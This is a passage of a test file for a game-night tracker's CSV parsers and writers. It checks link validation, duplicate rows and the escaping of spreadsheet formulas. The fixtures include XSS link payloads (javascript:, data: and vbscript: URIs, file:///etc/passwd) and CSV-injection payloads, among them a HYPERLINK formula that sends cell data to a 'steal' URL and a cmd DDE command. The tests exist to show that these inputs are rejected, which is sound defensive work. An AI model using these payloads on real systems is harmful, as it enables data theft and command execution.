    expect(rows).toStrictEqual([{ name: 'Pico Park', style: 'Puzzle\nGang Beasts,Party', tags: [] }]);
    expect(notes).toHaveLength(1);
    expect(notes[0]?.kind).toBe('warning');
    expect(notes[0]?.text).toMatch(/^games\.csv line 2: a quote .* never closed/);
  });

  it.each([
    'https://store.steampowered.com/app/945360/Among_Us/',
    'http://garticphone.com',
    'HTTPS://Example.com/Some%20Game?ref=list#top',
  ])('keeps the link %s', (link) => {
    expect(parseGames(`Game,Link\nSome Game,${link}\n`)).toStrictEqual({
      rows: [{ name: 'Some Game', link, tags: [] }],
      notes: [],
    });
  });

  it.each([
    'javascript:alert(1)',
    'JavaScript:alert(document.cookie)',
    ' javascript:alert(1)',
    'java\tscript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'ftp://example.com/game.zip',
    'mailto:someone@example.com',
    'steam://run/945360',
    'store.steampowered.com/app/945360/',
    '//example.com/game',
    '/games/among-us',
    'see the pinned post',
    'https://',
  ])('drops the link %j with a warning, keeping the game', (link) => {
    const { rows, notes } = parseGames(formatCsv([['Game', 'Link', 'Style'], ['Some Game', link, 'Party']]));
    expect(rows).toStrictEqual([{ name: 'Some Game', style: 'Party', tags: [] }]);
    expect(notes).toHaveLength(1);
    expect(notes[0]?.kind).toBe('warning');
    expect(notes[0]?.text).toMatch(/^games\.csv line 2: can't use the link "/);
  });

  it('keeps the first row of a game listed twice, and names the duplicate', () => {
    const text =
      'Game,Style\n' +
      'Among Us,Social deduction\n' +
      'Pico Park,Puzzle\n' +
      ' AMONG US ,Party\n' +
      'Among us,"javascript:not-a-link"\n';
    const { rows, notes } = parseGames(text);
    expect(rows).toStrictEqual([
      { name: 'Among Us', style: 'Social deduction', tags: [] },
      { name: 'Pico Park', style: 'Puzzle', tags: [] },
    ]);
    expect(notes.map((note) => note.kind)).toEqual(['warning', 'warning']);
    expect(notes.map((note) => note.text)).toEqual([
      'games.csv line 4: "AMONG US" is already listed on line 2, so this second row was ignored.',
      'games.csv line 5: "Among us" is already listed on line 2, so this second row was ignored.',
    ]);
  });

  it('does not report the link of a duplicate row it ignored', () => {
    const { notes } = parseGames('Game,Link\nPico Park,https://example.com/\nPico Park,javascript:alert(1)\n');
    expect(notes).toHaveLength(1);
    expect(notes[0]?.text).toContain('already listed');
  });

  it('reads nothing, with one warning, when there is no Game column', () => {
    const result = parseGames('Title,Style\nAmong Us,Social deduction\n');
    expect(result.rows).toEqual([]);
    expect(result.notes).toHaveLength(1);
    expect(result.notes[0]).toEqual({ kind: 'warning', text: expect.stringMatching(/games\.csv.*no "Game" column/) });
  });

  it.each(['', '  \n', '\uFEFF'])('reads nothing from an empty file (%j), without notes', (text) => {
    expect(parseGames(text)).toEqual({ rows: [], notes: [] });
  });

  it('lists at most 20 problems, then says how many more there were', () => {
    const lines = Array.from({ length: 23 }, (_, i) => `Game ${i + 1},example.com/${i + 1}\n`).join('');
    const { rows, notes } = parseGames(`Game,Link\n${lines}`);
    expect(rows).toHaveLength(23);
    expect(notes).toHaveLength(21);
    expect(notes[20]?.text).toBe('games.csv: 3 more rows have problems like these.');
  });

  it('trims every cell', () => {
    const text =
      `${GAMES_HEADER}\n` + ' Pico Park , Puzzle ,\tCo-op , Steam ,  https://example.com/pico , Cute ,  TECOPARK \n';
    expect(parseGames(text)).toStrictEqual({
      rows: [
        {
          name: 'Pico Park',
          style: 'Puzzle',
          mode: 'Co-op',
          where: 'Steam',
          link: 'https://example.com/pico',
          tags: ['Cute'],
          developer: 'TECOPARK',
        },
      ],
      notes: [],
    });
  });

  it('compares names of any alphabet, and names that are also object properties', () => {
    const text =
      'Game\nТетрис\nтетрис\n原神\nÉclair\nÉCLAIR\n' + // lines 2-6
      'constructor\n__proto__\ntoString\n__PROTO__\n' + // lines 7-10
      '🎲\n🎲\n';
    const { rows, notes } = parseGames(text);
    expect(rows.map((game) => game.name)).toEqual([
      'Тетрис',
      '原神',
      'Éclair',
      'constructor',
      '__proto__',
      'toString',
      '🎲',
    ]);
    expect(notes.map((note) => note.text)).toEqual([
      'games.csv line 3: "тетрис" is already listed on line 2, so this second row was ignored.',
      'games.csv line 6: "ÉCLAIR" is already listed on line 5, so this second row was ignored.',
      'games.csv line 10: "__PROTO__" is already listed on line 8, so this second row was ignored.',
      'games.csv line 12: "🎲" is already listed on line 11, so this second row was ignored.',
    ]);
  });

  it.each([
    '\u0001javascript:alert(1)', // browsers ignore control characters in front of a link
    'JAVASCRIPT\n:alert(1)',
    'javascript://example.com/%0Aalert(1)',
    'jav&#x09;ascript:alert(1)',
    'blob:https://example.com/5f1c',
    'view-source:https://example.com/',
    'https://example.com:99999/',
    'http://256.1.1.1/',
    'https ://example.com/',
    '=HYPERLINK("https://example.com/")',
  ])('also drops the link %j', (link) => {
    const { rows, notes } = parseGames(formatCsv([['Game', 'Link'], ['Some Game', link]]));
    expect(rows).toStrictEqual([{ name: 'Some Game', tags: [] }]);
    expect(notes).toHaveLength(1);
    expect(notes[0]?.text).toContain("can't use the link");
  });

  it.each([
    'https://пример.example/игра?q=日本語#🎲',
    'http://[::1]:8080/',
    'https://user@example.com/a%20b',
    'http://localhost/game',
  ])('keeps the unusual link %s', (link) => {
    expect(parseGames(`Game,Link\nSome Game,${link}\n`).rows[0]?.link).toBe(link);
  });

  it('does not cut an emoji in half when it shortens a link for a note', () => {
    const { notes } = parseGames(`Game,Link\nSome Game,x${'🎲'.repeat(60)}\n`);
    expect(notes[0]?.text.isWellFormed()).toBe(true);
    expect(notes[0]?.text).toContain(`"x${'🎲'.repeat(39)}…"`);
  });

  it('shortens a pasted wall of text in a note', () => {
    const text = formatCsv([
      ['Game', 'Link'],
      [`G${'a'.repeat(500)}`, 'x'],
      [`g${'A'.repeat(500)}`, `y\n${'z'.repeat(5000)}`],
    ]);
    const { notes } = parseGames(text);
    expect(notes).toHaveLength(2);
    for (const note of notes) expect(note.text.length).toBeLessThan(200);
    expect(notes[1]?.text).toMatch(/^games\.csv line 3: "gA+…" is already listed on line 2/);
  });
});

describe('sessionsToCsv and gamesToCsv', () => {
  it('writes the canonical sessions header and one line per row', () => {
    const row: SessionRow = {
      session: 'GN4',
      date: '2031-02-15',
      start: '10:30am',
      status: 'Played',
      games: ['Pico Park', 'Gang Beasts'],
      planned: ['Among Us'],
      cost: 'Free',
      announcedBy: 'Robin',
      source: AUTO_SOURCE,
      notes: 'Short, sweet',
    };
    expect(sessionsToCsv([row, { date: '2031-02-22', status: 'Cancelled', games: [], planned: [] }])).toBe(
      `${SESSIONS_HEADER}\n` +
        'GN4,2031-02-15,10:30am,Played,Pico Park; Gang Beasts,Among Us,Free,Robin,Announcement (auto),' +
        '"Short, sweet"\n' +
        ',2031-02-22,,Cancelled,,,,,,\n',
    );
    expect(sessionsToCsv([])).toBe(`${SESSIONS_HEADER}\n`);
  });

  it('writes the canonical games header and one line per game', () => {
    expect(gamesToCsv(games.slice(0, 2))).toBe(
      `${GAMES_HEADER}\n` +
        'Among Us,Social deduction,Competitive,Steam,https://store.steampowered.com/app/945360/,' +
        '"Multiplayer, Online Co-Op, Space",Innersloth\n' +
        'Gartic Phone,,,Browser,http://garticphone.com/,,\n',
    );
    expect(gamesToCsv([])).toBe(`${GAMES_HEADER}\n`);
  });

  it('writes several Planned games the way they are read: with ";" between them', () => {
    const row: SessionRow = {
      date: '2031-02-22',
      status: 'Cancelled',
      games: [],
      planned: ['Keep Talking, and Nobody Explodes', 'Pico Park', 'Gang Beasts'],
    };
    const csv = sessionsToCsv([row]);
    expect(csv).toBe(
      `${SESSIONS_HEADER}\n,2031-02-22,,Cancelled,,"Keep Talking, and Nobody Explodes; Pico Park; Gang Beasts",,,,\n`,
    );
    expect(parseSessions(csv)).toStrictEqual({ rows: [row], notes: [] });
    expect(parseSessions(appendSessions('Planned,Date,Status\n', [row])).rows).toStrictEqual([row]);
  });
});

describe('cells a spreadsheet would run as a formula', () => {
  // What a hostile announcement could put in the record: the game's name and the poster's name.
  const hostile: SessionRow = {
    session: '=1+1',
    date: '2031-08-02',
    start: '+10',
    status: 'Played',
    games: ['=HYPERLINK("http://example.com/steal?"&A1,"Among Us")', '+Plus', '@home'],
    planned: ['-KLAUS-'],
    cost: "=cmd|' /C calc'!A0",
    announcedBy: '@everyone',
    source: '-',
    notes: "'=already quoted",
  };
  const hostileGame: GameInfo = {
    name: '=SUM(1,2)',
    style: '+style',
    mode: '-mode',
    where: '@where',
    tags: ['=tag', '-tag'],
    developer: "''-dev",
  };
  const formulaCells = (csv: string) =>
    parseCsv(csv)
      .flat()
      .filter((cell) => /^\s*[=+\-@]/.test(cell));

  it('are never written as they are, by any of the writers', () => {
    const shuffled = 'Notes,Announced by,Planned,Games,Cost,EG,Start,Source,Date\r\n';
    expect(formulaCells(sessionsToCsv([hostile]))).toEqual([]);
    expect(formulaCells(appendSessions('', [hostile]))).toEqual([]);
    expect(formulaCells(appendSessions(shuffled, [hostile]))).toEqual([]);
    expect(formulaCells(gamesToCsv([hostileGame]))).toEqual([]);
    expect(formulaCells(appendGames('', [hostileGame]))).toEqual([]);
    expect(formulaCells(appendGames('Developer,Steam tags,Where,Mode,Style,Name\n', [hostileGame]))).toEqual([]);
  });

  it('get an apostrophe in front, which a spreadsheet shows as text', () => {
    const row: SessionRow = {
      session: '=1+1',
      date: '2031-08-02',
      status: 'Played',
      games: ['-KLAUS-', '+1'],
      planned: [],
      announcedBy: '@everyone',
    };
    expect(appendSessions('Session,Date,Games,Announced by\n', [row])).toBe(
      "Session,Date,Games,Announced by\n'=1+1,2031-08-02,'-KLAUS-; +1,'@everyone\n",
    );
    expect(appendGames('Game,Tags\n', [{ name: '+Positive', tags: ['-a', '=b'] }])).toBe(
      'Game,Tags\n\'+Positive,"\'-a, =b"\n',
    );
  });

  it('are also caught behind a tab, a space or a line break', () => {
    const row: SessionRow = {
      date: '2031-08-02',
      status: 'Played',
      games: ['\t=1+1'],
      planned: [],
      notes: ' \r\n@x',
    };
    expect(formulaCells(appendSessions('Date,Games,Notes\n', [row]))).toEqual([]);
  });

  it('read back as they were', () => {
    expect(parseSessions(sessionsToCsv([hostile]))).toStrictEqual({ rows: [hostile], notes: [] });
    expect(parseSessions(appendSessions('', [hostile]))).toStrictEqual({ rows: [hostile], notes: [] });
    expect(parseGames(gamesToCsv([hostileGame]))).toStrictEqual({ rows: [hostileGame], notes: [] });
    expect(parseGames(appendGames('', [hostileGame]))).toStrictEqual({ rows: [hostileGame], notes: [] });
  });

  it('leave other cells alone: an apostrophe, or a sign that is not at the start', () => {
    const row: SessionRow = {
      session: "'Til Dawn night",
      date: '2031-08-09',
      status: 'Played',
      games: ['Among Us', '=second in the list'],
      planned: [],
      cost: '$-1',
      notes: 'a = b',
    };
    const csv = sessionsToCsv([row]);
    expect(csv).toBe(
      `${SESSIONS_HEADER}\n'Til Dawn night,2031-08-09,,Played,Among Us; =second in the list,,$-1,,,a = b\n`,
    );
    expect(parseSessions(csv).rows).toStrictEqual([row]);
  });

  it('are read as they are when the owner wrote them without the apostrophe', () => {
    const { rows, notes } = parseSessions("Date,Games,Cost,Notes\n2031-08-16,-KLAUS-; 'Til Dawn,=free,'90s night\n");
    expect(rows[0]).toMatchObject({ games: ['-KLAUS-', "'Til Dawn"], cost: '=free', notes: "'90s night" });
    expect(notes).toEqual([]);
  });

  it('are checked as usual once the apostrophe is off', () => {
    const { rows, notes } = parseGames('Game,Link\n\'=Game,\'=HYPERLINK("https://example.com/")\n');
    expect(rows).toStrictEqual([{ name: '=Game', tags: [] }]);
    expect(notes[0]?.text).toContain('can\'t use the link "=HYPERLINK(');
  });
});

describe('appendSessions', () => {
  const existing = `${SESSIONS_HEADER}\nGN1,2031-01-04,10:30am,Played,Among Us,,Free,Robin,#announcements,\n`;
  const added: SessionRow = {
    session: 'GN2',
    date: '2031-01-11',
    start: '10:30am',
    status: 'Played',
    games: ['Pico Park', 'Gang Beasts'],
    planned: [],
    announcedBy: 'Robin',
    source: AUTO_SOURCE,
  };

  it('adds the rows after the existing text, which stays exactly as it was', () => {
    const cancelled: SessionRow = { date: '2031-01-18', status: 'Cancelled', games: [], planned: [] };
    const result = appendSessions(existing, [added, cancelled]);
    expect(result).toBe(
      `${existing}GN2,2031-01-11,10:30am,Played,Pico Park; Gang Beasts,,,Robin,Announcement (auto),\n` +
        ',2031-01-18,,Cancelled,,,,,,\n',
    );
  });

  it('returns the text unchanged when there is nothing to add', () => {
    expect(appendSessions(existing, [])).toBe(existing);
    expect(appendSessions('', [])).toBe('');
    expect(appendSessions('Session,Date', [])).toBe('Session,Date');
  });

  it('adds a line break first when the text does not end with one', () => {
    const text = 'Session,Date\nGN1,2031-01-04';
    expect(appendSessions(text, [added])).toBe(`${text}\nGN2,2031-01-11\n`);
    expect(appendSessions('Session,Date', [added])).toBe('Session,Date\nGN2,2031-01-11\n');
  });

  it('does not touch odd spacing, blank lines or old spellings in the existing text', () => {
    const text = '\n  date , EG,Status\n1/4/2031,GN1,played\n\n\n3/9/31 ,GN0 ,No EG\n\n';
    const result = appendSessions(text, [added]);
    expect(result).toBe(`${text}2031-01-11,GN2,Played\n`);
    expect(parseSessions(result).rows.map((row) => row.session)).toEqual(['GN1', 'GN2', 'GN0']);
  });

  it("uses the file's own column order, leaving unknown columns empty and missing ones out", () => {
    const text = 'Notes,Attendance,Date,Game(s) played,EG,Start (PT)\nFun,7,2031-01-04,Among Us,GN1,10:30am\n';
    const row: SessionRow = { ...added, cost: 'Free', notes: 'Robin picked, as usual' };
    expect(appendSessions(text, [row])).toBe(
      `${text}"Robin picked, as usual",,2031-01-11,Pico Park; Gang Beasts,GN2,10:30am\n`,
    );
  });

  it('fills only the first of two columns with the same meaning, as the parser reads it', () => {
    const text = 'Date,Start,Start (ET)\n2031-01-04,10:30am,1:30pm\n';
    expect(appendSessions(text, [added])).toBe(`${text}2031-01-11,10:30am,\n`);
  });

  it('uses CRLF when the first line break of the file is CRLF', () => {
    const crlf = 'Session,Date\r\nGN1,2031-01-04\r\n';
    expect(appendSessions(crlf, [added, { ...added, session: 'GN3', date: '2031-01-18' }])).toBe(
      `${crlf}GN2,2031-01-11\r\nGN3,2031-01-18\r\n`,
    );
    // No final line break: the one that's added is the file's kind too.
    expect(appendSessions('Session,Date\r\nGN1,2031-01-04', [added])).toBe(
      'Session,Date\r\nGN1,2031-01-04\r\nGN2,2031-01-11\r\n',
    );
    // Mixed endings: the first one decides.
    expect(appendSessions('Session,Date\nGN1,2031-01-04\r\n', [added])).toBe(
      'Session,Date\nGN1,2031-01-04\r\nGN2,2031-01-11\n',
    );
    expect(appendSessions('Session,Date\r\nGN1,2031-01-04\n', [added])).toBe(
      'Session,Date\r\nGN1,2031-01-04\nGN2,2031-01-11\r\n',
    );
    // A lone CR is a line break too: when it comes first, a later CRLF doesn't count.
    expect(appendSessions('Session,Date\rGN1,2031-01-04\r\n', [added])).toBe(
      'Session,Date\rGN1,2031-01-04\r\nGN2,2031-01-11\n',
    );
  });

  it('uses LF for a file with lone CR line breaks, without adding another break', () => {
    const text = 'Session,Date\rGN1,2031-01-04\r';
    expect(appendSessions(text, [added])).toBe(`${text}GN2,2031-01-11\n`);
  });

  it('keeps a byte order mark', () => {
    const text = '\uFEFFSession,Date\r\nGN1,2031-01-04\r\n';
    const result = appendSessions(text, [added]);
    expect(result).toBe(`${text}GN2,2031-01-11\r\n`);
    expect(parseSessions(result).rows.map((row) => row.session)).toEqual(['GN1', 'GN2']);
  });

  it('writes the canonical header first into an empty file', () => {
    const line = 'GN2,2031-01-11,10:30am,Played,Pico Park; Gang Beasts,,,Robin,Announcement (auto),\n';
    expect(appendSessions('', [added])).toBe(`${SESSIONS_HEADER}\n${line}`);
    expect(appendSessions('\uFEFF', [added])).toBe(`\uFEFF${SESSIONS_HEADER}\n${line}`);
    expect(appendSessions('\n\n', [added])).toBe(`\n\n${SESSIONS_HEADER}\n${line}`);
    expect(appendSessions('  ', [added])).toBe(`  \n${SESSIONS_HEADER}\n${line}`);
    expect(appendSessions('\r\n', [added])).toBe(`\r\n${SESSIONS_HEADER}\r\n${line.replace('\n', '\r\n')}`);
  });

  it('quotes new cells that need it', () => {
    const row: SessionRow = {
      session: 'GN2',
      date: '2031-01-11',
      status: 'Played',
      games: ['Keep Talking, and Nobody Explodes'],
      planned: [],
      notes: 'Sam said "again!"\nNext week maybe',
    };
    const result = appendSessions('Session,Date,Games,Notes\r\n', [row]);
    expect(result).toBe(
      'Session,Date,Games,Notes\r\n' +
        'GN2,2031-01-11,"Keep Talking, and Nobody Explodes","Sam said ""again!""\nNext week maybe"\r\n',
    );
    expect(parseSessions(result).rows).toStrictEqual([row]);
  });

  it('adds rows the parser reads back, to any of these files', () => {
    for (const text of ['', existing, existing.replaceAll('\n', '\r\n'), `\uFEFF${existing.trimEnd()}`]) {
      const before = parseSessions(text).rows;
      const result = appendSessions(text, sessions);
      expect(result.startsWith(text)).toBe(true);
      expect(parseSessions(result)).toStrictEqual({ rows: [...before, ...sessions], notes: [] });
    }
  });

  it('can be applied again to its own result', () => {
    const once = appendSessions('', [sessions[0] as SessionRow]);
    const twice = appendSessions(once, sessions.slice(1));
    expect(twice).toBe(sessionsToCsv(sessions));
  });

  it('leaves a file alone when the new rows could not be read back from it', () => {
    // No Date column: every row would be unreadable.
    const noDate = 'Session,When,Games\nGN1,2031-01-04,Among Us\n';
    expect(appendSessions(noDate, [added])).toBe(noDate);
    // An unclosed quote would swallow the new rows into the last cell.
    const openQuote = 'Session,Date,Notes\nGN1,2031-01-04,"never closed\n';
    expect(appendSessions(openQuote, [added])).toBe(openQuote);
    // Every other column is there, and two that only look like the Date column.
    const others = 'Session,Dates,Date added,Start,Status,Games,Planned,Cost,Announced by,Source,Notes\n';
    expect(appendSessions(others, [added])).toBe(others);
  });

  it('only needs a Date column, and fills no column that just looks like one of the others', () => {
    expect(appendSessions('Date\n2031-01-04\n', [added])).toBe('Date\n2031-01-04\n2031-01-11\n');
    const text = 'Session notes,Games count,Restart,Date,Est. cost,Start time,Costs';
    expect(appendSessions(text, [{ ...added, cost: 'Free' }])).toBe(`${text}\n,,,2031-01-11,,10:30am,Free\n`);
  });

  it('adds a line break after a last line of only spaces', () => {
    const text = 'Session,Date\nGN1,2031-01-04\n   ';
    const result = appendSessions(text, [added]);
    expect(result).toBe(`${text}\nGN2,2031-01-11\n`);
    expect(parseSessions(result).rows.map((row) => row.session)).toEqual(['GN1', 'GN2']);
  });

  it('writes under the header names of an older export', () => {
    const text = 'EG,Date,Start (PT),Status,Game(s) played,Planned instead,Cost at the time\n';
    const row: SessionRow = { ...added, planned: ['Among Us'], cost: 'Free' };
    expect(appendSessions(text, [row])).toBe(
      `${text}GN2,2031-01-11,10:30am,Played,Pico Park; Gang Beasts,Among Us,Free\n`,
    );
  });

  it('adds emoji, quotes and non-Latin text that read back the same', () => {
    const text = '\uFEFFNotes,Announced by,Games,Date,EG\r\n';
    const row: SessionRow = {
      session: '第3回 🎲',
      date: '2031-07-12',
      status: 'Played',
      games: ['Тетрис', '"Untitled" Goose Game, the sequel'],
      planned: [],
      announcedBy: 'Zoë 🦊',
      notes: 'Sam: "👍👍"\r\n(twice)',
    };
    const result = appendSessions(text, [row]);
    expect(result.startsWith(text)).toBe(true);
    expect(result.endsWith('\r\n')).toBe(true);
    expect(parseSessions(result)).toStrictEqual({ rows: [row], notes: [] });
  });

  it('adds many rows to a long file', () => {
    const many = Array.from({ length: 3000 }, (_, i): SessionRow => ({ ...added, session: `GN${i + 2}` }));
    const once = appendSessions(existing, many);
    const twice = appendSessions(once, many);
    expect(twice.startsWith(once)).toBe(true);
    expect(parseSessions(twice).rows).toHaveLength(6001);
  });
});

describe('appendGames', () => {
  const added: GameInfo = {
    name: 'Gang Beasts',
    style: 'Party brawler',
    mode: 'Competitive',
    where: 'Steam',
    link: 'https://store.steampowered.com/app/285900/',
    tags: ['Multiplayer', 'Funny', 'Physics'],
    developer: 'Boneloaf',
  };

  it('adds the games after the existing text, which stays exactly as it was', () => {
    const text = `${GAMES_HEADER}\nPico Park,Puzzle,Co-op,Steam,,,\n`;
    expect(appendGames(text, [added, { name: 'Gartic Phone', tags: [] }])).toBe(
      `${text}Gang Beasts,Party brawler,Competitive,Steam,https://store.steampowered.com/app/285900/,` +
        '"Multiplayer, Funny, Physics",Boneloaf\n' +
        'Gartic Phone,,,,,,\n',
    );
  });

  it("uses the file's own columns, line ending and byte order mark", () => {
    const text = '\uFEFFSteam tags,Name,Rating,Co-op or competitive\r\n"Puzzle, Co-op",Pico Park,4,Co-op';
    const result = appendGames(text, [added]);
    expect(result).toBe(`${text}\r\n"Multiplayer, Funny, Physics",Gang Beasts,,Competitive\r\n`);
    expect(parseGames(result).rows).toStrictEqual([
      { name: 'Pico Park', mode: 'Co-op', tags: ['Puzzle', 'Co-op'] },
      { name: 'Gang Beasts', mode: 'Competitive', tags: ['Multiplayer', 'Funny', 'Physics'] },
    ]);
  });

  it('writes the canonical header first into an empty file', () => {
    expect(appendGames('', [{ name: 'Pico Park', tags: [] }])).toBe(`${GAMES_HEADER}\nPico Park,,,,,,\n`);
    expect(appendGames(' \n', games)).toBe(` \n${gamesToCsv(games)}`);
  });

  it('returns the text unchanged when there is nothing to add', () => {
    expect(appendGames('', [])).toBe('');
    expect(appendGames('Game,Style', [])).toBe('Game,Style');
  });

  it('leaves a file without a Game column alone', () => {
    const text = 'Title,Style\nAmong Us,Social deduction\n';
    expect(appendGames(text, [added])).toBe(text);
    // Every other column is there, and one that only looks like the Game column.
    const others = 'Game mode,Style,Mode,Where,Link,Tags,Developer\nCo-op,Puzzle,Co-op,Steam,,"Cute, Puzzle",\n';
    expect(appendGames(others, [added])).toBe(others);
  });

  it('only needs a Game column', () => {
    expect(appendGames('Game\nPico Park\n', [added])).toBe('Game\nPico Park\nGang Beasts\n');
    expect(appendGames('Style,Rating,Game', [added])).toBe('Style,Rating,Game\nParty brawler,,Gang Beasts\n');
  });

  it('writes under the header names of an older export', () => {
    const text = 'Name,Steam link,Steam tags\n';
    expect(appendGames(text, [added])).toBe(
      `${text}Gang Beasts,https://store.steampowered.com/app/285900/,"Multiplayer, Funny, Physics"\n`,
    );
  });

  it('leaves a file alone when it ends inside a quote that is never closed', () => {
    const text = 'Game,Style\nPico Park,"Puzzle\n';
    expect(appendGames(text, [added])).toBe(text);
  });
});
